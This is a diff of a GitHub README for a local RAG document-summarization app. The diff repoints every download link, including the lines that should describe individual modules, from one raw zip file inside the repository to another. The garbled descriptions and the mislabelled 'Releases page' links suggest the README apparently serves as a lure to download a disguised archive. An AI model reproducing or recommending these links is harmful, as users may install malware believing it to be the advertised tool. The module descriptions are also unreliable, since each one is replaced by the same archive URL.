@@ -1,6 +1,6 @@
 # 📄 Rag_document_project - Summarize Documents with Ease
 
-[![Download Latest Release](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip%20Latest%20Release-v1.0-blue)](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip)
+[![Download Latest Release](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip)
 
 ## 📦 Overview
 
@@ -10,16 +10,16 @@ Simple RAG is a local-first document summarization and Q&A tool designed for bus
 
 This repository contains:
 
-- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip`**  
+- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip`**  
   The Streamlit UI for uploading documents and using the summarizer and Q&A assistant.
 
-- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip`**  
+- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip`**  
   Utilities to load documents and manage chunking.
 
-- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip`**  
+- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip`**  
   A wrapper for the FAISS vector store and its helpers.
 
-- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip`**  
+- **`https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip`**  
   An interface for small language models, optimized for local usage with Ollama and has OpenAI as a backup.
 
 ## 🚀 Getting Started
@@ -30,7 +30,7 @@ To start using the Simple RAG application, follow these steps to download and ru
 
 Go to the Releases page to get the latest version of the application:
 
-[Download Latest Release](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip)
+[Download Latest Release](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip)
 
 ### 2. Choose Your File
 
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 Ready to get started? Click the link below to download Simple RAG and transform how you summarize documents!
 
-[Download Latest Release](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/rag/document_Rag_project_2.1-alpha.4.zip)
+[Download Latest Release](https://github.com/jdahuhb823/Rag_document_project/raw/refs/heads/main/scripts/project_document_Rag_1.3.zip)
